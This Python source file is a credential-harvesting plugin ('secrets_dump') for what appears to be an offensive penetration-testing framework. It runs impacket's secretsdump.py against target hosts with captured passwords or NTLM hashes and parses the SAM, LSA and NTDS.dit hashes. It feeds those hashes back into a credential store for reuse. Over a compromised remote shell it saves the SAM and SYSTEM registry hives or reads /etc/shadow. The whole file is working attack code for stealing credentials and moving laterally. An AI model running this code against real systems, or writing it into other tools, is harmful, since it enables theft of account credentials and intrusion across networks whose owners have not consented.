"""Secrets dump — SAM/LSA/NTDS.dit extraction via shell or impacket."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)


class SecretsDumpPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="secrets_dump",
        display_name="Secrets Dump",
        category=PluginCategory.LATERAL,
        description="SAM/LSA/NTDS.dit extraction for credential harvesting",
        produces=["credentials"],
        timeout=120.0,
        requires_http=False,
        requires_credentials=True,
        risk_level="destructive",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {
            "sam_hashes": [], "lsa_secrets": [],
            "ntds_hashes": [], "method": "",
        }

        # Method 1: Remote secretsdump via impacket
        if ctx.subprocess_mgr and ctx.creds:
            all_creds = ctx.creds.get_for_target(target.host)
            ntlm_creds = ctx.creds.get_by_type("ntlm_hash")
            creds_to_try = all_creds + ntlm_creds

            domain = target.meta.get("ad_domain", "")

            for cred in creds_to_try[:3]:
                if ctx.should_stop:
                    break

                if cred.secret_type == "ntlm_hash":
                    auth = f"-hashes :{cred.secret}"
                else:
                    auth = f"'{cred.secret}'"

                domain_prefix = f"{domain}/" if domain else ""
                cmd = (
                    f"secretsdump.py {domain_prefix}{cred.username}@{target.host} "
                    f"{auth}"
                )
                result = await ctx.subprocess_mgr.run(cmd, timeout=60)

                if result.returncode == 0 and result.stdout:
                    output = result.stdout
                    data["method"] = "impacket_remote"

                    # Parse SAM hashes
                    in_sam = False
                    in_lsa = False
                    for line in output.splitlines():
                        if "[*] Dumping local SAM" in line:
                            in_sam = True
                            in_lsa = False
                            continue
                        if "[*] Dumping LSA Secrets" in line:
                            in_sam = False
                            in_lsa = True
                            continue
                        if "[*] Dumping Domain Credentials" in line:
                            in_sam = False
                            in_lsa = False
                        if ":::" in line:
                            if in_sam:
                                data["sam_hashes"].append(line)
                            else:
                                data["ntds_hashes"].append(line)
                        elif in_lsa and line.strip():
                            data["lsa_secrets"].append(line)

                    # Store extracted hashes in credential store
                    for hash_line in data["sam_hashes"] + data["ntds_hashes"]:
                        parts = hash_line.split(":")
                        if len(parts) >= 4 and ctx.creds:
                            ctx.creds.add(
                                username=parts[0],
                                secret=parts[3],
                                secret_type="ntlm_hash",
                                source="secretsdump",
                                target=target.host,
                                domain=domain,
                            )

                    if data["sam_hashes"]:
                        findings.append(Finding.critical(
                            f"SAM hashes dumped: {len(data['sam_hashes'])}",
                            evidence="\n".join(data["sam_hashes"][:10]),
                            description="Local account NTLM hashes extracted",
                            tags=["lateral", "secretsdump", "sam"],
                        ))

                    if data["ntds_hashes"]:
                        findings.append(Finding.critical(
                            f"NTDS hashes dumped: {len(data['ntds_hashes'])}",
                            evidence="\n".join(data["ntds_hashes"][:10]),
                            description="Domain account NTLM hashes extracted",
                            tags=["lateral", "secretsdump", "ntds"],
                        ))

                    if data["lsa_secrets"]:
                        findings.append(Finding.high(
                            f"LSA secrets extracted: {len(data['lsa_secrets'])}",
                            evidence="\n".join(data["lsa_secrets"][:10]),
                            description="LSA secrets may contain service account passwords",
                            tags=["lateral", "secretsdump", "lsa"],
                        ))
                    break

        # Method 2: Via shell — reg save SAM/SYSTEM
        if not data["method"]:
            shells = ctx.state.get("active_shells", [])
            if shells and ctx.shell:
                session = (
                    ctx.shell.get_session(shells[0]["id"])
                    if isinstance(shells[0], dict) else None
                )
                if session:
                    from basilisk.utils.shell import ShellOS
                    if session.os == ShellOS.WINDOWS:
                        # Try to save SAM and SYSTEM hives
                        sam_save = await ctx.shell.execute(
                            session,
                            'reg save HKLM\\SAM C:\\Temp\\SAM /y 2>nul && echo OK',
                            timeout=10.0,
                        )
                        sys_save = await ctx.shell.execute(
                            session,
                            'reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM /y 2>nul && echo OK',
                            timeout=10.0,
                        )
                        if sam_save and "OK" in sam_save and sys_save and "OK" in sys_save:
                            data["method"] = "reg_save"
                            findings.append(Finding.critical(
                                "SAM and SYSTEM hives saved",
                                evidence="C:\\Temp\\SAM, C:\\Temp\\SYSTEM",
                                description=(
                                    "Registry hives extracted. Crack with: "
                                    "secretsdump.py -sam SAM -system SYSTEM LOCAL"
                                ),
                                tags=["lateral", "secretsdump", "sam"],
                            ))
                    else:
                        # Linux — check for shadow file access
                        shadow = await ctx.shell.execute(
                            session,
                            "cat /etc/shadow 2>/dev/null | head -20",
                            timeout=5.0,
                        )
                        if shadow and ":" in shadow:
                            data["method"] = "shadow_read"
                            data["sam_hashes"] = shadow.strip().splitlines()
                            findings.append(Finding.critical(
                                f"Shadow file readable: {len(data['sam_hashes'])} entries",
                                evidence=shadow[:500],
                                description="Password hashes extracted from /etc/shadow",
                                tags=["lateral", "secretsdump", "shadow"],
                            ))

        if not findings:
            findings.append(Finding.info(
                "Secrets dump failed — insufficient privileges",
                tags=["lateral", "secretsdump"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
